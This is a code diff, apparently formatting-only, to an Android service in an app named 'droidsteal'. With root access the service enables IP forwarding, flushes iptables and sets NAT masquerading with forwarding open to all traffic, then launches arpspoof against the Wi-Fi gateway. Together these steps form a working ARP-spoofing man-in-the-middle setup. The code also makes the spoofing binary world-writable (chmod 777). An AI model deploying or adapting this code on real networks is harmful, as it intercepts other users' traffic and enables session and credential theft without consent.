@@ -26,13 +26,6 @@
 
 package com.zbrown.droidsteal.services;
 
-import java.io.IOException;
-
-import com.zbrown.droidsteal.activities.ListenActivity;
-import com.zbrown.droidsteal.arpspoof.ExecuteCommand;
-import com.zbrown.droidsteal.helper.Constants;
-import com.zbrown.droidsteal.helper.SystemHelper;
-
 import android.app.IntentService;
 import android.content.Context;
 import android.content.Intent;
@@ -40,78 +33,84 @@ import android.net.wifi.WifiManager;
 import android.os.Bundle;
 import android.os.PowerManager;
 import android.util.Log;
+import com.zbrown.droidsteal.activities.ListenActivity;
+import com.zbrown.droidsteal.arpspoof.ExecuteCommand;
+import com.zbrown.droidsteal.helper.Constants;
+import com.zbrown.droidsteal.helper.SystemHelper;
+
+import java.io.IOException;
 
 public class ArpspoofService extends IntentService {
 
-	private final 			String IPV4_FILEPATH = "/proc/sys/net/ipv4/ip_forward";
-	
-	private final 			String IPTABLES_CLEAR_NAT 	= "iptables -t nat -F";
-	private final 			String IPTABLES_CLEAR		= "iptables -F";
-	private final 			String IPTABLES_POSTROUTE   = "iptables -t nat -I POSTROUTING -s 0/0 -j MASQUERADE";
-	private final 			String IPTABLES_ACCEPT_ALL  = "iptables -P FORWARD ACCEPT";
-	
-	private static final 	String TAG = "ArpspoofService";
-	private volatile 		Thread myThread;
-	private static volatile WifiManager.WifiLock wifiLock;
-	private static volatile PowerManager.WakeLock wakeLock;
+    private final String IPV4_FILEPATH = "/proc/sys/net/ipv4/ip_forward";
 
-	public ArpspoofService() {
-		super("ArpspoofService");
-	}
+    private final String IPTABLES_CLEAR_NAT = "iptables -t nat -F";
+    private final String IPTABLES_CLEAR = "iptables -F";
+    private final String IPTABLES_POSTROUTE = "iptables -t nat -I POSTROUTING -s 0/0 -j MASQUERADE";
+    private final String IPTABLES_ACCEPT_ALL = "iptables -P FORWARD ACCEPT";
 
-	@Override
-	public void onHandleIntent(Intent intent) {
-		Bundle bundle = intent.getExtras();
-		String localBin = bundle.getString("localBin");
-		String gateway = bundle.getString("gateway");
-		String wifiInterface = bundle.getString("interface");
-		final String command = localBin + " -s 1 -i " + wifiInterface + " " + gateway;
-		
-		SystemHelper.execSUCommand("chmod 777 " + SystemHelper.getARPSpoofBinaryPath(this), ListenActivity.debugging);
-		SystemHelper.execSUCommand("echo 1 > " + IPV4_FILEPATH, ListenActivity.debugging);
-		
-		SystemHelper.execSUCommand(IPTABLES_CLEAR, 		ListenActivity.debugging);
-		SystemHelper.execSUCommand(IPTABLES_CLEAR_NAT, 	ListenActivity.debugging);
-		SystemHelper.execSUCommand(IPTABLES_POSTROUTE, 	ListenActivity.debugging);
-		SystemHelper.execSUCommand(IPTABLES_ACCEPT_ALL, ListenActivity.debugging);
+    private static final String TAG = "ArpspoofService";
+    private volatile Thread myThread;
+    private static volatile WifiManager.WifiLock wifiLock;
+    private static volatile PowerManager.WakeLock wakeLock;
 
-		PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-		WifiManager wm = (WifiManager) getSystemService(Context.WIFI_SERVICE);
-		wifiLock = wm.createWifiLock(WifiManager.WIFI_MODE_FULL, "wifiLock");
-		wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "wakeLock");
-		wifiLock.acquire();
-		wakeLock.acquire();
-		try {
-			myThread = new ExecuteCommand(command, false);
-			myThread.setDaemon(true);
-			myThread.start();
-			myThread.join();
-		} catch (IOException e) {
-			Log.e(TAG, "error initializing arpspoof command", e);
-		} catch (InterruptedException e) {
-			Log.i(TAG, "Spoofing was interrupted", e);
-		} finally {
-			if (myThread != null)
-				myThread = null;
-			if (wifiLock.isHeld()) {
-				wifiLock.release();
-			}
-			if (wakeLock.isHeld()) {
-				wakeLock.release();
-			}
-			stopForeground(true);
-		}
-	}
+    public ArpspoofService() {
+        super("ArpspoofService");
+    }
 
-	@Override
-	public void onDestroy() {
-		//at the suggestion of the internet
-		if (myThread != null) {
-			Thread tmpThread = myThread;
-			myThread = null;
-			tmpThread.interrupt();
-		}
-		SystemHelper.execSUCommand(Constants.CLEANUP_COMMAND_ARPSPOOF, ListenActivity.debugging);
+    @Override
+    public void onHandleIntent(Intent intent) {
+        Bundle bundle = intent.getExtras();
+        String localBin = bundle.getString("localBin");
+        String gateway = bundle.getString("gateway");
+        String wifiInterface = bundle.getString("interface");
+        final String command = localBin + " -s 1 -i " + wifiInterface + " " + gateway;
+
+        SystemHelper.execSUCommand("chmod 777 " + SystemHelper.getARPSpoofBinaryPath(this), ListenActivity.debugging);
+        SystemHelper.execSUCommand("echo 1 > " + IPV4_FILEPATH, ListenActivity.debugging);
+
+        SystemHelper.execSUCommand(IPTABLES_CLEAR, ListenActivity.debugging);
+        SystemHelper.execSUCommand(IPTABLES_CLEAR_NAT, ListenActivity.debugging);
+        SystemHelper.execSUCommand(IPTABLES_POSTROUTE, ListenActivity.debugging);
+        SystemHelper.execSUCommand(IPTABLES_ACCEPT_ALL, ListenActivity.debugging);
+
+        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+        WifiManager wm = (WifiManager) getSystemService(Context.WIFI_SERVICE);
+        wifiLock = wm.createWifiLock(WifiManager.WIFI_MODE_FULL, "wifiLock");
+        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "wakeLock");
+        wifiLock.acquire();
+        wakeLock.acquire();
+        try {
+            myThread = new ExecuteCommand(command, false);
+            myThread.setDaemon(true);
+            myThread.start();
+            myThread.join();
+        } catch (IOException e) {
+            Log.e(TAG, "error initializing arpspoof command", e);
+        } catch (InterruptedException e) {
+            Log.i(TAG, "Spoofing was interrupted", e);
+        } finally {
+            if (myThread != null)
+                myThread = null;
+            if (wifiLock.isHeld()) {
+                wifiLock.release();
+            }
+            if (wakeLock.isHeld()) {
+                wakeLock.release();
+            }
+            stopForeground(true);
+        }
+    }
+
+    @Override
+    public void onDestroy() {
+        //at the suggestion of the internet
+        if (myThread != null) {
+            Thread tmpThread = myThread;
+            myThread = null;
+            tmpThread.interrupt();
+        }
+        SystemHelper.execSUCommand(Constants.CLEANUP_COMMAND_ARPSPOOF, ListenActivity.debugging);
 //		SystemHelper.execSUCommand("echo 0 > " + IPV4_FILEPATH, ListenActivity.debugging);
-	}
+    }
 }
